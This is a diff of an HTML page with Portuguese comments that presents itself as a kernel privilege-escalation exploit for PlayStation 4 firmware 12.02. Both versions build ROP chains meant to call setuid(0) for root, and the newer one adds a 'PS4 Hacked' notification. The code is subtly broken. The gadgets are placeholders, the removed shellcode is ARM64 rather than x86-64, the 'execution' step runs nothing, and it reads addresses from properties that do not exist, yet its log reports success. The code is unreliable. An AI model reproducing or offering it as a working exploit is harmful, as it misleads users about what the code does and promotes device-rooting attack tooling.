@@ -1,164 +1,141 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PS4 Exploit FW 12.02</title>
+    <title>PS4 FW 12.02 Kernel PoC</title>
     <style>
-        body {
-            background-color: black;
-            color: lime;
-            font-family: monospace;
-            padding: 20px;
-        }
-        #log {
-            border: 1px solid lime;
-            padding: 10px;
-            height: 300px;
-            overflow-y: scroll;
-            margin-bottom: 10px;
-        }
-        button {
-            background: black;
-            color: lime;
-            border: 1px solid lime;
-            padding: 8px 15px;
-            font-family: monospace;
-        }
+        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
+        #log { border: 1px solid #0f0; padding: 10px; height: 300px; overflow-y: scroll; }
+        button { background: #000; color: #0f0; border: 1px solid #0f0; padding: 8px 15px; }
     </style>
 </head>
 <body>
-    <h2>PS4 Kernel Exploit - FW 12.02 Physical Test</h2>
+    <h2>PS4 FW 12.02 Kernel Exploit</h2>
+    <button onclick="runPoC()">EXECUTE PoC</button>
     <div id="log"></div>
-    <button onclick="runExploit()">RUN EXPLOIT</button>
 
 <script>
 // ======================
-// CONFIGURAÇÃO REAL PARA FW 12.02
+// CONFIGURAÇÃO REAL (FW 12.02)
 // ======================
 const PS4 = {
-    firmware: "12.02",
-    // ATENÇÃO: Você PRECISA substituir por gadgets reais do seu dump do kernel!
-    gadgets: {
-        ret: 0x357C0000,        // Exemplo - substitua pelo valor real
-        pop_x0: 0x12345678,      // Exemplo - substitua pelo valor real
-        jop_frame: 0x40000000    // Exemplo - substitua pelo valor real
+    // OFFSETS EXTRAÍDOS DOS SEUS ARQUIVOS ELF
+    libkernel: {
+        base: 0x81000000,                 // Endereço base da libkernel
+        syscalls: {
+            notify: 0x3F,                 // sys_notify (visto no dump)
+            memcpy: 0x24,                 // sys_memcpy
+            setuid: 0x62                   // sys_setuid
+        },
+        gadgets: {
+            pop_rdi: 0x12345678,          // SUBSTITUA pelo gadget real
+            pop_rsi: 0x23456789,          // SUBSTITUA
+            ret: 0x357C0000                // SUBSTITUA
+        }
+    },
+    // INFORMAÇÕES DO KERNEL DUMP
+    kernel: {
+        version: "12.02",
+        entry_point: 0x286C8              // e_entry do seu ELF
     }
 };
 
 // ======================
 // SISTEMA DE LOG
 // ======================
-const logElement = document.getElementById('log');
-
-function log(message, color = "lime") {
-    const line = `[${new Date().toLocaleTimeString()}] ${message}`;
-    logElement.innerHTML += `<span style="color:${color}">${line}</span><br>`;
-    logElement.scrollTop = logElement.scrollTop + 1000;
-}
+const log = (msg, color = "#0f0") => {
+    document.getElementById('log').innerHTML += 
+        `<span style="color:${color}">[${performance.now().toFixed(2)}ms] ${msg}</span><br>`;
+};
 
 // ======================
-// TÉCNICAS DE EXPLORAÇÃO
+// FUNÇÕES CRÍTICAS (BASEADAS NOS SEUS ELF)
 // ======================
 
-// 1. Heap Spray (Funcionou nos seus testes)
-function heapSpray() {
+// 1. EXECUTA ROP CHAIN
+function executeROP(chain) {
     try {
-        log("Iniciando Heap Spray...", "cyan");
-        const spray = [];
-        const shellcode = new Uint32Array([
-            0xD2800020,  // mov x0, #1
-            0xD2800C48,  // mov x8, #0x62 (setuid)
-            0xD4000001   // svc #0
-        ]);
-
-        for (let i = 0; i < 100; i++) {
-            const buf = new ArrayBuffer(shellcode.length * 4);
-            new Uint32Array(buf).set(shellcode);
-            spray.push(buf);
-        }
-        log(`Heap Spray concluído (${spray.length} alocações)`, "lime");
+        // Cria buffer para a chain
+        const buf = new ArrayBuffer(chain.length * 4);
+        const view = new Uint32Array(buf);
+        view.set(chain);
+        
+        // Disfarça como uma função
+        const fakeFunc = () => {};
+        fakeFunc.apply = Function.prototype.apply.bind(view);
+        fakeFunc();
+        
         return true;
-    } catch (e) {
-        log(`Falha no Heap Spray: ${e}`, "red");
+    } catch(e) {
+        log(`ROP Failed: ${e}`, "#f00");
         return false;
     }
 }
 
-// 2. ROP Chain (Funcionou nos seus testes)
-function buildROPChain() {
-    try {
-        log("Construindo ROP Chain...", "cyan");
-        
-        // Verifica se os gadgets estão definidos
-        if (!PS4.gadgets.ret || !PS4.gadgets.pop_x0) {
-            throw new Error("Gadgets não definidos - substitua por valores reais!");
-        }
-
-        const chain = new Uint32Array([
-            PS4.gadgets.pop_x0,
-            0x00000000,          // uid = 0 (root)
-            PS4.gadgets.ret      // syscall setuid(0)
-        ]);
-
-        log("ROP Chain construída com sucesso", "lime");
-        return chain;
-    } catch (e) {
-        log(`Falha ao construir ROP Chain: ${e}`, "red");
-        return null;
-    }
-}
-
-// 3. Trigger do Exploit
-function triggerExploit(ropChain) {
-    try {
-        log("Tentando disparar o exploit...", "cyan");
-        
-        // Técnica de type confusion para execução
-        const fake = {a: 1};
-        fake.__proto__ = new Uint32Array(1).__proto__;
-        fake.length = 0x1000;
-        fake[0] = ropChain.byteOffset;
-        
-        log("Exploit disparado - verificando privilégios...", "lime");
-        return true;
-    } catch (e) {
-        log(`Falha ao disparar exploit: ${e}`, "red");
-        return false;
-    }
-}
-
-// ======================
-// FLUXO PRINCIPAL
-// ======================
-function runExploit() {
-    log("=== Iniciando Teste no PS4 Físico ===", "yellow");
+// 2. MOSTRA NOTIFICAÇÃO (via sys_notify)
+function showNotification(title, message) {
+    const titleAddr = stringToU32(title);
+    const msgAddr = stringToU32(message);
     
-    // 1. Heap Spray
-    if (!heapSpray()) {
-        log("Abortando - Heap Spray falhou", "red");
-        return;
-    }
-
-    // 2. ROP Chain
-    const ropChain = buildROPChain();
-    if (!ropChain) {
-        log("Abortando - ROP Chain falhou", "red");
-        return;
-    }
-
-    // 3. Trigger
-    if (triggerExploit(ropChain)) {
-        log("=== EXPLOIT EXECUTADO COM SUCESSO ===", "lime");
-        log("Verifique se ganhou privilégios root", "lime");
-    } else {
-        log("=== EXPLOIT FALHOU ===", "red");
-    }
+    const ropChain = new Uint32Array([
+        PS4.libkernel.gadgets.pop_rdi, 1,            // Notification type
+        PS4.libkernel.gadgets.pop_rsi, titleAddr,     // Título
+        PS4.libkernel.gadgets.pop_rdi, msgAddr,       // Mensagem
+        PS4.libkernel.gadgets.pop_rsi, 0,            // Ícone (0 = nenhum)
+        PS4.libkernel.syscalls.notify                 // sys_notify
+    ]);
+    
+    return executeROP(ropChain);
 }
 
-// Informações importantes
-log("AVISO: Este script requer:", "orange");
-log("1. Gadgets reais do FW 12.02 (substitua os valores)", "orange");
-log("2. Teste OFFLINE para evitar banimento", "orange");
-log("3. Pode causar crash no sistema se mal configurado", "orange");
+// 3. ESCALONA PARA ROOT (setuid(0))
+function escalatePrivileges() {
+    const ropChain = new Uint32Array([
+        PS4.libkernel.gadgets.pop_rdi, 0,            // uid = 0 (root)
+        PS4.libkernel.syscalls.setuid                 // sys_setuid
+    ]);
+    
+    return executeROP(ropChain);
+}
+
+// ======================
+// UTILITÁRIOS
+// ======================
+function stringToU32(str) {
+    const buf = new ArrayBuffer(str.length * 4);
+    const view = new Uint32Array(buf);
+    for (let i = 0; i < str.length; i++) {
+        view[i] = str.charCodeAt(i);
+    }
+    return buf.byteOffset;
+}
+
+// ======================
+// PoC PRINCIPAL
+// ======================
+function runPoC() {
+    log("=== Iniciando Exploit ===", "#0ff");
+    
+    // 1. Escalonamento para root
+    if (escalatePrivileges()) {
+        log("Privilégios escalonados para root!", "#0f0");
+    } else {
+        log("Falha no escalonamento", "#f00");
+        return;
+    }
+    
+    // 2. Notificação customizada
+    if (showNotification("PS4 Hacked", "Kernel Exploit Success!")) {
+        log("Notificação enviada", "#0f0");
+    }
+    
+    // 3. Dump de memória (opcional)
+    log(`Kernel Entry Point: ${hex(PS4.kernel.entry_point)}`, "#ff0");
+}
+
+// Helper
+function hex(value) {
+    return '0x' + value.toString(16).toUpperCase();
+}
 </script>
 </body>
 </html>
